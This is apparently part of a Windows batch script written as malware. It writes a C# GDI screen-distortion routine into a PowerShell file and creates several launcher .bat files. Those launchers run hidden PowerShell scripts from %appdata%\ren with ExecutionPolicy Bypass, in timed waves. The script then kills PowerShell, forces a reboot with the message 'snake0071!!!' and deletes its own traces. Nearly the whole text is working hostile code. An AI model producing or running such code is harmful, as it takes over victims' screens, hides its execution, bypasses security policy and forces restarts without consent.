echo     [DllImport("user32.dll")]                                                                                                                                                            >> 9.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                                                                         >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, uint dwRop);                           >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern IntPtr CreateCompatibleDC(IntPtr hdc);                                                                                                                          >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);                                                                                             >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);                                                                                                                >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern bool DeleteObject(IntPtr hObject);                                                                                                                              >> 9.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                             >> 9.ps1
echo     public static extern bool DeleteDC(IntPtr hdc);                                                                                                                                      >> 9.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                            >> 9.ps1
echo     public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);                                                                                                               >> 9.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                            >> 9.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                                                                      >> 9.ps1
echo     public const uint SRCCOPY = 0x00CC0020;                                                                                                                                              >> 9.ps1
echo     public static void ManipulateGraphics(int repeatCount)                                                                                                                               >> 9.ps1
echo     {                                                                                                                                                                                    >> 9.ps1
echo         IntPtr hdcSource = GetDC(IntPtr.Zero);                                                                                                                                           >> 9.ps1
echo         IntPtr hdcDest = CreateCompatibleDC(hdcSource);                                                                                                                                  >> 9.ps1
echo         RECT rect;                                                                                                                                                                       >> 9.ps1
echo         GetWindowRect(GetDesktopWindow(), out rect);                                                                                                                                     >> 9.ps1
echo         int width = rect.Right - rect.Left;                                                                                                                                              >> 9.ps1
echo         int height = rect.Bottom - rect.Top;                                                                                                                                             >> 9.ps1
echo         int step = 7; // 빨려들어가는 간격                                                                                                                                                       >> 9.ps1
echo         int delay = 0; // 각 프레임 사이의 딜레이(ms)                                                                                                                                              >> 9.ps1
echo         IntPtr hBitmap = IntPtr.Zero;                                                                                                                                                    >> 9.ps1
echo         IntPtr hOldBitmap = IntPtr.Zero;                                                                                                                                                 >> 9.ps1
echo         try                                                                                                                                                                              >> 9.ps1
echo         {                                                                                                                                                                                >> 9.ps1
echo             hBitmap = IntPtr.Zero;                                                                                                                                                       >> 9.ps1
echo             hBitmap = CreateCompatibleBitmap(hdcSource, width, height);                                                                                                                  >> 9.ps1
echo             hOldBitmap = SelectObject(hdcDest, hBitmap);                                                                                                                                 >> 9.ps1
echo             for (int repeat = 0; repeat < repeatCount; repeat++)                                                                                                                         >> 9.ps1
echo             {                                                                                                                                                                            >> 9.ps1
echo                 for (int i = 0; i ^< width / 2; i += step)                                                                                                                                >> 9.ps1
echo                 {                                                                                                                                                                        >> 9.ps1
echo                     int xDest = rect.Left - i;                                                                                                                                           >> 9.ps1
echo                     int yDest = rect.Top - i;                                                                                                                                            >> 9.ps1
echo                     int copyWidth = width - 2 * i;                                                                                                                                       >> 9.ps1
echo                     int copyHeight = height - 2 * i;                                                                                                                                     >> 9.ps1
echo                     BitBlt(hdcDest, xDest, yDest, copyWidth, copyHeight, hdcSource, xDest + step, yDest + step, SRCCOPY);                                                                >> 9.ps1
echo                     BitBlt(hdcSource, 0, 0, width, height, hdcDest, 0, 0, SRCCOPY);                                                                                                      >> 9.ps1
echo                     Thread.Sleep(delay);                                                                                                                                                 >> 9.ps1
echo                 }                                                                                                                                                                        >> 9.ps1
echo             }                                                                                                                                                                            >> 9.ps1
echo         }                                                                                                                                                                                >> 9.ps1
echo         finally                                                                                                                                                                          >> 9.ps1
echo         {                                                                                                                                                                                >> 9.ps1
echo             if (hBitmap ^!= IntPtr.Zero)                                                                                                                                                  >> 9.ps1
echo             {                                                                                                                                                                            >> 9.ps1
echo                 SelectObject(hdcDest, hOldBitmap);                                                                                                                                       >> 9.ps1
echo                 DeleteObject(hBitmap);                                                                                                                                                   >> 9.ps1
echo             }                                                                                                                                                                            >> 9.ps1
echo             DeleteDC(hdcDest);                                                                                                                                                           >> 9.ps1
echo             ReleaseDC(IntPtr.Zero, hdcSource);                                                                                                                                           >> 9.ps1
echo         }                                                                                                                                                                                >> 9.ps1
echo     }                                                                                                                                                                                    >> 9.ps1
echo }                                                                                                                                                                                        >> 9.ps1
echo public struct RECT                                                                                                                                                                       >> 9.ps1
echo {                                                                                                                                                                                        >> 9.ps1
echo     public int Left;                                                                                                                                                                     >> 9.ps1
echo     public int Top;                                                                                                                                                                      >> 9.ps1
echo     public int Right;                                                                                                                                                                    >> 9.ps1
echo     public int Bottom;                                                                                                                                                                   >> 9.ps1
echo }                                                                                                                                                                                        >> 9.ps1
echo ^"@                                                                                                                                                                                      >> 9.ps1
echo [GraphicsHelper]::ManipulateGraphics(545325)                                                                                                                                             >> 9.ps1



echo cd %appdata%\ren\ > 0.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 0.bat
set "ea=%appdata%\ren\benben.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 0.bat

echo cd %appdata%\ren\ > 1.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 1.bat
set "ea=%appdata%\ren\1.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 1.bat

echo cd %appdata%\ren\ > 2b.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 2b.bat
set "ea=%appdata%\ren\2b.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 2b.bat

echo cd %appdata%\ren\ > 3.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 3.bat
set "ea=%appdata%\ren\3.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 3.bat

echo cd %appdata%\ren\ > 4.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 4.bat
set "ea=%appdata%\ren\4.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 4.bat

echo cd %appdata%\ren\ > 5.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 5.bat
set "ea=%appdata%\ren\5.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 5.bat

echo cd %appdata%\ren\ > 6.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 6.bat
set "ea=%appdata%\ren\6.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 6.bat

echo cd %appdata%\ren\ > 7.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 7.bat
set "ea=%appdata%\ren\7.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 7.bat

echo cd %appdata%\ren\ > 6l.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 6l.bat
set "ea=%appdata%\ren\6l.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 6l.bat

echo cd %appdata%\ren\ > 7l.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 7l.bat
set "ea=%appdata%\ren\7l.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 7l.bat

echo cd %appdata%\ren\ > 8.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 8.bat
set "ea=%appdata%\ren\8.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 8.bat

echo cd %appdata%\ren\ > 9.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 9.bat
set "ea=%appdata%\ren\9.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 9.bat

start /min 0.bat
start /min 5.bat
start /min 6.bat
timeout 20
start /min 2b.bat
start /min 2b.bat
start /min 3.bat
start /min 6.bat
timeout 20
start /min 4.bat
start /min 1.bat
timeout 30
start /min 7.bat
timeout 40
start /min taskkill /f /im powershell.exe
start /min 0.bat
start /min 8.bat
start /min 4.bat
start /min 9.bat
timeout 20
start /min taskkill /f /im powershell.exe
start /min 0.bat
start /min 7l.bat
start /min 6l.bat
shutdown -r -t 15 -c "snake0071!!!"
timeout 10
del /s /q %appdata%\ren